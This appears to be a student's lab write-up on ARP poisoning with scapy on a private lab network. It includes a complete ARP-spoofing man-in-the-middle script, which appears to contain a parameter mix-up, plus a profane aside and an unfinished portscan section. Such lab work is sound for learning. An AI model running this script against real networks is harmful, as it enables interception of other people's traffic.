# Secure Admin Tools - Lab IV

## ARP Poisoning and Portscan

Install scapy with all main dependancies
```bash
sudo apt install python3-scapy
```

Start scapy
```bash
sudo scapy3
```

> It took me fucking 6 hours to understand and getting things ready for using this fucking shit of a fucking tool mother fucker, I am so pissed !!

To simplify all the usage: We have got differenct python Classes for different packet types. At first we are going to create a Ethernet packet followed by a ARP packet. To append two layers, we will use the operator / 
 
To show all available fields of a packet we can use the function list(PACKET) where PACKET can be Ether or ARP or anything else available. 

At first we will use the command `arp -a` to list the local arp table of our server

```console
nichil@secat-02:~$ arp -a
? (192.168.130.1) at 00:50:56:c0:00:08 [ether] on ens33
? (192.168.130.128) at 00:0c:29:3a:31:c6 [ether] on ens33
_gateway (192.168.130.2) at 00:50:56:e3:fb:3c [ether] on ens33
```

> enable packet forwarding so the spoofed packets can be forwarded accordingly `echo 1 > /proc/sys/net/ipv4/ip_forward`

Let's build up a broadcast ARP request

```python
>>> arpbc=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst="192.168.130.2")
>>> arpbc.show()
###[ Ethernet ]###
  dst= ff:ff:ff:ff:ff:ff
  src= 00:0c:29:3a:31:c6
  type= 0x806
###[ ARP ]###
     hwtype= 0x1
     ptype= 0x800
     hwlen= None
     plen= None
     op= who-has
     hwsrc= 00:0c:29:3a:31:c6
     psrc= 192.168.130.128
     hwdst= None
     pdst= 192.168.130.2

>>> response=srp(arpbc, timeout=2)
Begin emission:
...Finished sending 1 packets.
*
Received 4 packets, got 1 answers, remaining 0 packets
>>> response
(<Results: TCP:0 UDP:0 ICMP:0 Other:1>,
 <Unanswered: TCP:0 UDP:0 ICMP:0 Other:0>)
>>> response[0]
<Results: TCP:0 UDP:0 ICMP:0 Other:1>
>>> response[0][0]
(<Ether  dst=ff:ff:ff:ff:ff:ff type=0x806 |<ARP  op=who-has pdst=192.168.130.2 |>>,
 <Ether  dst=00:0c:29:3a:31:c6 src=00:50:56:e3:fb:3c type=0x806 |<ARP  hwtype=0x1 ptype=0x800 hwlen=6 plen=4 op=is-at hwsrc=00:50:56:e3:fb:3c psrc=192.168.130.2 hwdst=00:0c:29:3a:31:c6 pdst=192.168.130.128 |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>>)
>>> response[0][0][0]
<Ether  dst=ff:ff:ff:ff:ff:ff type=0x806 |<ARP  op=who-has pdst=192.168.130.2 |>>
>>> response[0][0][1]
<Ether  dst=00:0c:29:3a:31:c6 src=00:50:56:e3:fb:3c type=0x806 |<ARP  hwtype=0x1 ptype=0x800 hwlen=6 plen=4 op=is-at hwsrc=00:50:56:e3:fb:3c psrc=192.168.130.2 hwdst=00:0c:29:3a:31:c6 pdst=192.168.130.128 |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>>
>>> response[0][0][1].hwsrc
'00:50:56:e3:fb:3c'
```

So we can shorten this down to following code lines for both gateway and target server

```
# gateway
arpbc=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst="192.168.130.2")
arpbcrsp=srp(arpbc)
arpbcrsp[0][0][1].hwsrc

```

Knowing this information we can write a short script to spoof ARP continiously

```python
from scapy.config import conf
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, sendp, send
from time import sleep

__author__ = "Nichil Strasser"
__email__ = "nichil.strasser@gmail.com"


def main():
    conf.verb = False
    spoof_ip = "192.168.130.2"
    spoof_mac = get_mac(spoof_ip)
    victim_ip = "192.168.130.129"
    victim_mac = get_mac(victim_ip)

    try:
        print("Sending spoofed arp")
        while True:
            spoof(victim_ip=victim_ip, spoof_ip=spoof_ip, sppof_mac=spoof_mac)
            spoof(victim_ip=spoof_ip, spoof_ip=victim_ip, sppof_mac=victim_mac)
            sleep(1)

    except KeyboardInterrupt:
        print("Healing victim")
        heal_victim(victim_ip, victim_mac, spoof_ip, spoof_mac)
        heal_victim(spoof_ip, spoof_mac, victim_ip, victim_mac)


def heal_victim(tip, tmac, sip, smac):
    packet = ARP(op="is-at", pdst=tip, hwdst=tmac, psrc=sip, hwsrc=smac)
    send(packet)


def spoof(victim_ip, spoof_ip, sppof_mac):
    faulty_arp_reply = ARP(op="is-at", psrc=spoof_ip, pdst=victim_ip, hwdst=sppof_mac)
    send(faulty_arp_reply)


def get_mac(ip):
    arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=ip)
    arp_broadcast_response = srp(arp_broadcast)
    return arp_broadcast_response[0][0][1].hwsrc


if __name__ == "__main__":
    main()


```

In order to test the spoofing I am going to use tcpdump and nc. I will listen on Port 6969 on theMachine and open a connection from secat-02 to theMachine on Port 6969. As the Mac address on the ARP table of secat-02 for the gateway got swapped with mine, I will receive the messages sent over port 6969 on secat-01 which is the MITM in this scenario. The packets will be forwarded because I have enabled ipv4 forwarding. The packets are captured with tcpdump using the -X arg to see ASCII encoded data. 

![arp_spoof_proof.PNG](arp_spoof_proof.PNG)


## Portscan

Login to its.fh-campuswien.ac.at is the one which was set in lab3

... tbc